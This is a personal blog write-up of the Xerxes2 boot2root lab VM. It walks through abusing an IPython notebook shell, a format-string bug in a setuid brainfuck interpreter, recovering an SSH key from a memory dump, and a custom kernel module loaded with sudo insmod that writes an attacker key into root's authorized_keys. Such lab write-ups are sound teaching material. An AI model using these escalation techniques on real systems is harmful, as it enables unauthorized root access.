file format of first :( Next I resorted to using qemu. And success!\n  Running $ qemu first, booted a vm and ran the bootsector code, revealing a password of amFuaWNl. The next part was pretty easy. I assumed this was the password word for the potentially GPG encrypted dump file:\npolito@xerxes2:~$ gpg -d dump.gpg  decrypted_dump gpg: CAST5 encrypted data gpg: encrypted with 1 passphrase gpg: WARNING: message was not integrity protected polito@xerxes2:~$ file decrypted_dump decrypted_dump: data polito@xerxes2:~$ ls -lh decrypted_dump -rw-r--r-- 1 polito polito 126M Aug 10 02:12 decrypted_dump So we successfully decrypted dump.gpg it seems resulting in a 126M file, however at first glance it appears to just be junk. I paged and paged and paged and paged and paged through less until I saw cleartext that looked like kernel boot messages. The first thought that came to mind after seeing this was “Could this be some sort of memory dump?”.\nAs the kernel messages were interesting, I decided to put the decrypted dump through strings. Eventually after going through even more pages, it seemed like there were even some command history in the dump. Ok, well then I believe its time to look for things that could relate to that file in /opt/backup:\npolito@xerxes2:~$ grep $(ls /opt/backup/) decrypted_strings korenchkin.tar.enc openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc polito@xerxes2:~$ Heh, ok. Easy enough. korenchkin.tar.enc was encrypted using openssl. We can simply decrypt this with the -d flag. From the dump we were able to get the password used too:\npolito@xerxes2:~$ openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out ~/korenchkin.tar polito@xerxes2:~$ file korenchkin.tar korenchkin.tar: POSIX tar archive (GNU) polito@xerxes2:~$ tar xvf korenchkin.tar .ssh/id_rsa .ssh/id_rsa.pub polito@xerxes2:~$ Extracting korenchkin.tar revealed a SSH key pair, so to become korenchkin I copied the SSH key to my Kali VM and SSH in as korenchkin:\nroot@kali:~# ssh -i korenchkin.key korenchkin@192.168.56.102 Welcome to xerxes2. XERXES wishes you a pleasant stay. ____ ___ ____ ___ __ ____ ___ ____ ____ ____ `MM( )P' 6MMMMb `MM 6MM `MM( )P' 6MMMMb 6MMMMb\\  6MMMMb `MM` ,P 6M' `Mb MM69 \" `MM` ,P 6M' `Mb MM' ` MM' `Mb `MM,P MM MM MM' `MM,P MM MM YM. ,MM `MM. MMMMMMMM MM `MM. MMMMMMMM YMMMMb ,MM' d`MM. MM MM d`MM. MM `Mb ,M' d' `MM. YM d9 MM d' `MM. YM d9 L ,MM ,M' _d_ _)MM_ YMMMM9 _MM_ _d_ _)MM_ YMMMM9 MYMMMM9 MMMMMMMM You have new mail. korenchkin@xerxes2:~$ You have new mail.\nbecoming root Again, enumeration is key. As korenchkin, you will see that you may run.\nkorenchkin@xerxes2:~$ sudo -l Matching Defaults entries for korenchkin on this host: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User korenchkin may run the following commands on this host: (root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod So we may run insmod as root. Immediately this hints towards the fact that we will need to write a custom kernel module and maybe spawn a shell? And so, we board another educational school bus ride towards kernel module land.\nI confirmed that the kernel-headers were installed for the current kernel. Googling around got me to a sample “Hello World!” kernel module. This together with a sample Makefile was working fine. The sources for the files initially tested were:\n#include  /* Needed by all modules */#include  /* Needed for KERN_INFO */#include  /* Needed for the macros */ static int __init hello_start(void) { printk(KERN_INFO \"Loading hello module...\\n\"); return 0; } static void __exit hello_end(void) { printk(KERN_INFO \"Goodbye Mr.\\n\"); } module_init(hello_start); module_exit(hello_end); obj-m += hello.o all: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules clean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean I took hello.c and the Makefile, put them into a directory, built the module with make, and loaded it. Once the module loaded I checked the kernel messages via dmesg to confirm it working:\nkorenchkin@xerxes2:~/kern$ make make -C /lib/modules/3.2.0-4-686-pae/build M=/home/korenchkin/kern modules make[1]: Entering directory `/usr/src/linux-headers-3.2.0-4-686-pae' CC [M] /home/korenchkin/kern/hello.o Building modules, stage 2. MODPOST 1 modules CC /home/korenchkin/kern/hello.mod.o LD [M] /home/korenchkin/kern/hello.ko make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae' korenchkin@xerxes2:~/kern$ sudo insmod hello.ko korenchkin@xerxes2:~/kern$ dmesg | tail [...] [68192.983366] hello: module license 'unspecified' taints kernel. [68192.983369] Disabling lock debugging due to kernel taint [68192.983637] Loading hello module... korenchkin@xerxes2:~/kern$ Alrighty, that was, easy! However, this is not really useful. I want command execution! So, what did I do? #include , and system() some commands to run stuff, getting me a /tmp/getroot prepared.\ninsert loud crash and burn sound here\nTurns out, kernel development is pretty anti command execution. Compiling modules that have stuff like stdio.h included will fail with headers not found type errors. One can hack the Makefile to include headers from /usr/include, but it just ends up being a mess. However, there is a handy little function in kmod.h called call_usermodehelper(). From the kernel docs, call_usermodehelper() will prepare and start a usermode application. That sounds pretty handy in our case :)\nSo, time to rewrite hello.c to be useful! Puzzling the pieces together I found on the internet, this amongst other pieces of information helped get the ball rolling.\n#include  /* Needed by all modules */ #include  /* Needed for KERN_INFO */ #include  /* Needed for the macros */ /* For our shell ^_^ */ #include int get_root (void) { char * envp[] = { \"HOME=/\", NULL }; char *argv[] = { \"/bin/bash\", \"-c\", \"/bin/cat /tmp/pubkey  /root/.ssh/authorized_keys\", NULL}; printk(KERN_INFO \"Call Usermodehelper...\\n\"); call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); printk(KERN_INFO \"Done usermodehelper...\\n\"); return 0; } static int __init hello_start(void) { printk(KERN_INFO \"Loading rooted module...\\n\"); return get_root(); return 0; } static void __exit hello_end(void) { printk(KERN_INFO \"Goodbye Mr.\\n\"); } module_init(hello_start); module_exit(hello_end); As can be seen in the code above, I added a function get_root(), that will append whatever is in /tmp/pubkey to /root/.ssh/authorized_keys using call_usermodehelper. /tmp/pubkey contained the public key of the keypair I generated at the beginning of starting Xerxes2. I modified Makefile to have obj-m += rooted.o this time, make’d the source and ran the insmod for the newly build rooted.ko. Then, I inspected the kernel messages again, and attempted to login as root:\nkorenchkin@xerxes2:~/kern$ vi rooted.c korenchkin@xerxes2:~/kern$ vi Makefile korenchkin@xerxes2:~/kern$ make make -C /lib/modules/3.2.0-4-686-pae/build M=/home/korenchkin/kern modules make[1]: Entering directory `/usr/src/linux-headers-3.2.0-4-686-pae' CC [M] /home/korenchkin/kern/rooted.o Building modules, stage 2. MODPOST 1 modules CC /home/korenchkin/kern/rooted.mod.o LD [M] /home/korenchkin/kern/rooted.ko make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae' korenchkin@xerxes2:~/kern$ echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6sCFrz036WAchGk66yROuY+hePiULr49D1E97wuK0mK4Uw0J+4u1ngDVw+h8xwtpxPZkOWcn7s86OkXcEkWzGoduC1Y+YMP0XnQFG4hdeX4yNypaAsLKZss6tTHe5kHzbTdiOUthSmiJHwyl39TXibSBILTnMOLaxzLM17xUCfJviRm2mOAq6uELYPPf8thzqVeBoIsdXfjh8QeLMRHloyjGe1ZeY0m4pqwg9d2azaBAirjBMv0cyk+1w51SNR61EQ6SRtc6BE7ayc6C+MZW4TkP/lwOQLH7CXrEoyL3bDskD6c9563jRSLtiVfzjfkjoyUDiTCWv/ThirZMqSot/\"  /tmp/pubkey korenchkin@xerxes2:~/kern$ sudo insmod rooted.ko korenchkin@xerxes2:~/kern$ dmesg | tail [ 14.512040] eth0: no IPv6 routers present [ 290.023022] Clocksource tsc unstable (delta = 4686567555 ns) [ 290.025022] Switching to clocksource acpi_pm [57198.109946] bf[25367]: segfault at 40062000 ip 40062000 sp bfc6282c error 14 [68192.983366] hello: module license 'unspecified' taints kernel. [68192.983369] Disabling lock debugging due to kernel taint [68192.983637] Loading hello module... [74155.086393] Loading rooted module... [74155.086397] Call Usermodehelper... [74155.086449] Done usermodehelper... korenchkin@xerxes2:~/kern$ logout Connection to 192.168.56.102 closed. root@kali:~/Desktop/xeres2# ssh root@192.168.56.102 -i delacroix Welcome to xerxes2. XERXES wishes you a pleasant stay. ____ ___ ____ ___ __ ____ ___ ____ ____ ____ `MM( )P' 6MMMMb `MM 6MM `MM( )P' 6MMMMb 6MMMMb\\  6MMMMb `MM` ,P 6M' `Mb MM69 \" `MM` ,P 6M' `Mb MM' ` MM' `Mb `MM,P MM MM MM' `MM,P MM MM YM. ,MM `MM. MMMMMMMM MM `MM. MMMMMMMM YMMMMb ,MM' d`MM. MM MM d`MM. MM `Mb ,M' d' `MM. YM d9 MM d' `MM. YM d9 L ,MM ,M' _d_ _)MM_ YMMMM9 _MM_ _d_ _)MM_ YMMMM9 MYMMMM9 MMMMMMMM root@xerxes2:~# id uid=0(root) gid=0(root) groups=0(root) root@xerxes2:~# cat /root/flag.txt ____ ___ ____ ___ __ ____ ___ ____ ____ ____ `MM( )P' 6MMMMb `MM 6MM `MM( )P' 6MMMMb 6MMMMb\\  6MMMMb `MM` ,P 6M' `Mb MM69 \" `MM` ,P 6M' `Mb MM' ` MM' `Mb `MM,P MM MM MM' `MM,P MM MM YM. ,MM `MM. MMMMMMMM MM `MM. MMMMMMMM YMMMMb ,MM' d`MM. MM MM d`MM. MM `Mb ,M' d' `MM. YM d9 MM d' `MM. YM d9 L ,MM ,M' _d_ _)MM_ YMMMM9 _MM_ _d_ _)MM_ YMMMM9 MYMMMM9 MMMMMMMM congratulations on beating xerxes2! I hope you enjoyed it as much as I did making xerxes2. xerxes1 has been described as 'weird' and 'left-field' and I hope that this one fits that description too :) Many thanks to @TheColonial \u0026 @rasta_mouse for testing! Ping me on #vulnhub for thoughts and comments! @barrebas, July 2014 root@xerxes2:~# conclusion Xerxes2 really challenged me into learning a ton of new things so this Vulnerable VM was a total win for me! Thanks @barrebas and @VulnHub for another great learning opportunity.\nNow, the next step? OSCP :)\n","wordCount":"5878","inLanguage":"en","datePublished":"2014-08-09T16:59:53Z","dateModified":"2014-08-09T16:59:53Z","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
 (Alt + H)">#!/bin/note
</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://leonjza.github.io/about/ title="About Me">
<span>About Me</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/archives title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/categories title=Categories>
<span>Categories</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
<h1 class=post-title>
Beating Xerxes2
</h1>
<div class=post-meta>August 9, 2014&nbsp;·&nbsp;28 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2014-08-09-beating-xerxes2.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#foreword aria-label=foreword>foreword</a></li>
<li>
<a href=#getting-started aria-label="getting started">getting started</a></li>
<li>
<a href=#first-shell-access aria-label="first shell access">first shell access</a></li>
<li>
<a href=#becoming-polito---the-why aria-label="becoming polito - the why">becoming polito - the why</a><ul>
<li>
<a href=#inspecting-bfc aria-label="inspecting bf.c">inspecting bf.c</a></li>
<li>
<a href=#finding-the-bf-vuln aria-label="finding the bf vuln">finding the bf vuln</a></li></ul>
</li>
<li>
<a href=#becoming-polito---the-how aria-label="becoming polito - the how">becoming polito - the how</a><ul>
<li>
<a href=#optbf---part1 aria-label="/opt/bf - part1">/opt/bf - part1</a></li>
<li>
<a href=#optbf---part2 aria-label="/opt/bf - part2">/opt/bf - part2</a></li>
<li>
<a href=#optbf---part3 aria-label="/opt/bf - part3">/opt/bf - part3</a></li>
<li>
<a href=#optbf---part4 aria-label="/opt/bf - part4">/opt/bf - part4</a></li>
<li>
<a href=#optbf---part5 aria-label="/opt/bf - part5">/opt/bf - part5</a></li></ul>
</li>
<li>
<a href=#becoming-korenchkin aria-label="becoming korenchkin">becoming korenchkin</a></li>
<li>
<a href=#becoming-root aria-label="becoming root">becoming root</a></li>
<li>
<a href=#conclusion aria-label=conclusion>conclusion</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><h2 id=foreword>foreword<a hidden class=anchor aria-hidden=true href=#foreword>#</a></h2>
<p>Xerxes2 is a successor in a boot2root series by <a href=https://twitter.com/barrebas>@barrebas</a> hosted by <a href=https://twitter.com/vulnhub>@VulnHub</a>. If you haven&rsquo;t done it yet, close this article <em>now</em> and go learn by doing it!</p>
<p>Xerxes2, like most other boot2root type CTF&rsquo;s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read <code>/root/flag.txt</code>. This is the path I took to read the flag and gain root command execution. Enjoy!</p>
<h2 id=getting-started>getting started<a hidden class=anchor aria-hidden=true href=#getting-started>#</a></h2>
<p>The tool of choice for Xerxes2 was again Kali Linux. I started up the VM and got the IP Address 192.158.56.102 assigned to it. So, to officially kick off the challenge, I started a NMAP scan:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# nmap -v --reason -sV 192.168.56.102 -p-

Starting Nmap 6.46 <span style=color:#f92672>(</span> http://nmap.org <span style=color:#f92672>)</span> at 2014-08-09 17:14 SAST
<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 6.0p1 Debian 4+deb7u2 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
80/tcp    open  http    syn-ack lighttpd 1.4.31
111/tcp   open  rpcbind syn-ack 2-4 <span style=color:#f92672>(</span>RPC <span style=color:#75715e>#100000)</span>
4444/tcp  open  krb524? syn-ack
8888/tcp  open  http    syn-ack Tornado httpd 2.3
57504/tcp open  status  syn-ack <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>RPC <span style=color:#75715e>#100024)</span>
<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 192.62 seconds
           Raw packets sent: <span style=color:#ae81ff>131149</span> <span style=color:#f92672>(</span>5.770MB<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>88</span> <span style=color:#f92672>(</span>3.544KB<span style=color:#f92672>)</span>

</code></pre></div><p>Well this gives us a boat load to test out already!</p>
<p>I quickly telneted’ to tcp/4444, and got presented with a large string being echoed back. To the eye this looked like a very large base64 string, so I opened <code>nc</code> to the port and redirected the output to a file <code>nc-string</code>. Once the string echoed completely, I quit the <code>nc</code>, and pushed the resultant string through a base64 decode and ran a <code>file</code> against it:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~#  nc 192.168.56.102 <span style=color:#ae81ff>4444</span> | tee nc-string
<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA
AKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo<span style=color:#f92672>=</span>
^C

root@kali:~# cat nc-string | base64 -d &gt; nc-data
root@kali:~# file nc-data
nc-data: MPEG ADTS, layer III, v2,  <span style=color:#ae81ff>64</span> kbps, 22.05 kHz, Monaural

</code></pre></div><p><code>nc-data</code> is a, audio file? Ok. I copied the file off Kali Linux, opened it in VLC player and pressed play.</p>
<p><em>(Electronic Noises & Robot Voice)</em> <em>This is Xerxes. Why do you persist in your loneliness?</em> <em>(Electronic Noises)</em></p>
<p>The start and end of the voice message had a clear in & out sound, with some static noises in the background. Then, at the end a strange whistling noise could be heard.</p>
<p>This was the first educational bus ride the Xerxes2 took me on. Learning about the structures of mp3 files etc.</p>
<p>Sadly, this file kept me busy for quite some time, trying to find a hidden message. In the end, I gave up and moved on to the other ports open the VM. Maybe I had to come back to this later, but the little progress I had made had me hope I didn&rsquo;t have to.</p>
<h2 id=first-shell-access>first shell access<a hidden class=anchor aria-hidden=true href=#first-shell-access>#</a></h2>
<p>Moving on to tcp/80, a standard website with not much interesting apart from a cool looking Xerxes2 logo was found:</p>
<figure>
<img loading=lazy src=/images/xerxesII_home.png>
</figure>
<p>However, moving on to tcp/8888, we see it identified as <code>Tornado httpd 2.3</code>. Some of you may recognize Tornado as a python httpd server. So, off to a browser we go!</p>
<p>tcp/8888 hosted a <a href=http://ipython.org/notebook.html>IPython Notebook</a>. We were able to easily create a new note, and abuse the shell command functionality of it for our own purposes. Shell command access could be achieved by prefixing typical shell commands with a <code>!</code>. I used this to enumerate a small bit of the current environment, and quickly decided to add myself a ssh key so that I can play further. So, I generated a new key pair just for Xerxes, and uploaded it for the <code>delacroix</code> user:</p>
<figure>
<img loading=lazy src=/images/xerxesII_ipython.png>
</figure>
<p>And then a easy SSH in:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# ssh -i delacroix delacroix@192.168.56.102
The authenticity of host <span style=color:#e6db74>&#39;192.168.56.102 (192.168.56.102)&#39;</span> can<span style=color:#e6db74>&#39;t be established.
</span><span style=color:#e6db74>ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.
</span><span style=color:#e6db74>Are you sure you want to continue connecting (yes/no)? yes
</span><span style=color:#e6db74>Warning: Permanently added &#39;</span>192.168.56.102<span style=color:#e6db74>&#39; (ECDSA) to the list of known hosts.
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>Welcome to xerxes2.
</span><span style=color:#e6db74>      XERXES wishes you
</span><span style=color:#e6db74>       a pleasant stay.
</span><span style=color:#e6db74>____   ___  ____  ___  __ ____   ___  ____     ____     ____
</span><span style=color:#e6db74>`MM(   )P&#39;</span> 6MMMMb <span style=color:#e6db74>`</span>MM 6MM <span style=color:#e6db74>`</span>MM<span style=color:#f92672>(</span>   <span style=color:#f92672>)</span>P<span style=color:#e6db74>&#39; 6MMMMb   6MMMMb\  6MMMMb
</span><span style=color:#e6db74> `MM` ,P  6M&#39;</span>  <span style=color:#e6db74>`</span>Mb MM69 <span style=color:#e6db74>&#34;  `MM` ,P  6M&#39;  `Mb MM&#39;    ` MM&#39;  `Mb
</span><span style=color:#e6db74>  `MM,P   MM    MM MM&#39;      `MM,P   MM    MM YM.           ,MM
</span><span style=color:#e6db74>   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;
</span><span style=color:#e6db74>   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M&#39;
</span><span style=color:#e6db74>  d&#39; `MM. YM    d9 MM       d&#39; `MM. YM    d9 L    ,MM ,M&#39;
</span><span style=color:#e6db74>_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>delacroix@xerxes2:~</span>$<span style=color:#e6db74>
</span></code></pre></div><h2 id=becoming-polito---the-why>becoming polito - the why<a hidden class=anchor aria-hidden=true href=#becoming-polito---the-why>#</a></h2>
<p>Once I had the first SSH access, life was a little less complicated. I could enumerate easier and learn the details about what I was facing. Things that stood out was a binary <code>/opt/bf</code>, owned by <code>polito</code> and had the SUID bit set for him. There was also a folder <code>/opt/backup</code>, with a file <code>korenchkin.tar.enc</code>. There was also mail in <code>/var/mail</code> for the user <code>korenchkin</code> which I am not able to read yet.</p>
<p>More interestingly, the <code>.bash_history</code> for the user I am now (delacroix), revealed that the <code>/opt/bf</code> command was recently run, and the sources for this binary was available as <code>bf.c</code>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>delacroix@xerxes2:~$ ls -lh
total 8.0K
-rw-r--r-- <span style=color:#ae81ff>1</span> delacroix delacroix 1.6K Jul <span style=color:#ae81ff>16</span> 12:42 bf.c
-rw-r--r-- <span style=color:#ae81ff>1</span> delacroix delacroix  <span style=color:#ae81ff>100</span> Aug  <span style=color:#ae81ff>9</span> 10:23 Untitled0.ipynb

delacroix@xerxes2:~$ history
    <span style=color:#ae81ff>1</span>  cd
    <span style=color:#ae81ff>2</span>  ls -alh
    <span style=color:#ae81ff>3</span>  /opt/bf <span style=color:#e6db74>&#34;&lt;&lt;++++[&gt;++++&lt;-]&gt;[&gt;+++++&gt;+++++&gt;+++++&gt;+++++&gt;++&gt;++++&gt;++++&gt;++++&gt;+++++&gt;++++&gt;+++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;----&gt;-&gt;-&gt;-----&gt;&gt;++++&gt;+++++&gt;+++++&gt;&gt;+++++&gt;++#&#34;</span>
    <span style=color:#ae81ff>4</span>  cp /media/politousb/bf.c .
    <span style=color:#ae81ff>5</span>  nano bf.c
    <span style=color:#ae81ff>6</span>  exit
    <span style=color:#ae81ff>7</span>  passwd
    <span style=color:#ae81ff>8</span>  exit

delacroix@xerxes2:~$ /opt/bf <span style=color:#e6db74>&#34;&lt;&lt;++++[&gt;++++&lt;-]&gt;[&gt;+++++&gt;+++++&gt;+++++&gt;+++++&gt;++&gt;++++&gt;++++&gt;++++&gt;+++++&gt;++++&gt;+++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;----&gt;-&gt;-&gt;-----&gt;&gt;++++&gt;+++++&gt;+++++&gt;&gt;+++++&gt;++#&#34;</span>
LOOK DEEPERdelacroix@xerxes2:~$
</code></pre></div><p>As you can see above, running it just prints <strong>LOOK DEEPER</strong>. I recognized the syntax as <a href=http://en.wikipedia.org/wiki/Brainfuck>brainfk</a> and figured that <code>/opt/bf</code> was simply a brainfk interpreter. But wait, lets inspect <code>bf.c</code>!</p>
<h3 id=inspecting-bfc>inspecting bf.c<a hidden class=anchor aria-hidden=true href=#inspecting-bfc>#</a></h3>
<p>A quick read of <code>bf.c</code> confirmed the suspicions that <code>/opt/bf</code> was simply a brainfk interpreter. A buffer was set for the input program, then a function called <code>bf()</code> was called to process the brainfk program. Each instruction in the brainfk was handled with a case statement:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;.&#39;</span><span style=color:#f92672>:</span>
    printf(<span style=color:#e6db74>&#34;%c&#34;</span>, buf[datapointer]);
    <span style=color:#66d9ef>break</span>;
<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;,&#39;</span><span style=color:#f92672>:</span>
    buf[datapointer] <span style=color:#f92672>=</span> getchar();
    <span style=color:#66d9ef>break</span>;
<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;&gt;&#39;</span><span style=color:#f92672>:</span>
    datapointer <span style=color:#f92672>=</span> (datapointer <span style=color:#f92672>==</span> (BUF_SIZE<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)) <span style=color:#f92672>?</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>:</span> <span style=color:#f92672>++</span>datapointer;
    <span style=color:#66d9ef>break</span>;
<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;&lt;&#39;</span><span style=color:#f92672>:</span>
    datapointer <span style=color:#f92672>=</span> (datapointer <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) <span style=color:#f92672>?</span> (BUF_SIZE<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) <span style=color:#f92672>:</span> <span style=color:#f92672>--</span>datapointer;
    <span style=color:#66d9ef>break</span>;
<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;+&#39;</span><span style=color:#f92672>:</span>
    buf[datapointer]<span style=color:#f92672>++</span>;
    <span style=color:#66d9ef>break</span>;
<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;-&#39;</span><span style=color:#f92672>:</span>
    buf[datapointer]<span style=color:#f92672>--</span>;

</code></pre></div><p>Soooo, here we started on the second educational bus ride to mount brainfk. In summary, I learnt that I could write a program as simple as <code>,.</code>, and run it with <code>/opt/bf</code>, which will accept a character and then echo it back to me immediately. I also learnt that if you had say, 62 <code>+</code>, and ran that with a brainfk interpreter like <code>/opt/bf</code>, then you would have the character with ASCII value 62 in memory. You can then print that value with <code>.</code>, or move on the next memory cell with a <code>&lt;</code>. The most important thing to learn about brainfk was, <em>there are no high level features. No file IO, no socket IO, nothing</em>.</p>
<p>That was our brainfk class for the day.</p>
<h3 id=finding-the-bf-vuln>finding the bf vuln<a hidden class=anchor aria-hidden=true href=#finding-the-bf-vuln>#</a></h3>
<p>With all that brainfk, I was still not closer to actually finding the stepping stone to the next part of Xerxes2. That was until I re-read <code>bf.c</code>, and realized that one of the case statements was for <code>#</code>, and that when a hash is present it will run:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;#&#39;</span><span style=color:#f92672>:</span>
    <span style=color:#75715e>// new feature
</span><span style=color:#75715e></span>    printf(buf);
    <span style=color:#66d9ef>break</span>;
</code></pre></div><p>Classic format string vulnerability!</p>
<p>As exciting as this may seem, it was not really for me. I had already previously struggled with a format string vulnerability, and this case it was present so early in the CTF that I feared I would not be able to complete this one. However, the goal was now clear. I need to <em>somehow</em> exploit this format string vuln, as brainfk, and get that to run my own code, potentially gaining me a shell as <code>polito</code>.</p>
<h2 id=becoming-polito---the-how>becoming polito - the how<a hidden class=anchor aria-hidden=true href=#becoming-polito---the-how>#</a></h2>
<p>Doing research about format string vulnerabilities, you will see that generally the flow goes something along the lines of:</p>
<ul>
<li>print <code>AAAA%x%x%x%x</code>, adding <code>%s</code> until you see the hex for of A (41), meaning that you are trying to find the position in the stack that <code>printf</code> is placing the arguments.</li>
<li>Test for direct parameter access. Assuming you saw the 41414141 in position 16, test with a payload of <code>AAAA%16$x</code>.</li>
<li><code>objdump -R /your/bin</code> and find a call in the GOT to override.</li>
<li>Place some shellcode as environment variable, ie: <code>EGG</code>, prefixed with say 200 <code>0x90</code>.</li>
<li>use <code>gdb</code>, and find your NOP sled, and choose a position in memory to where you want to override the pointer for a call from the GOT.</li>
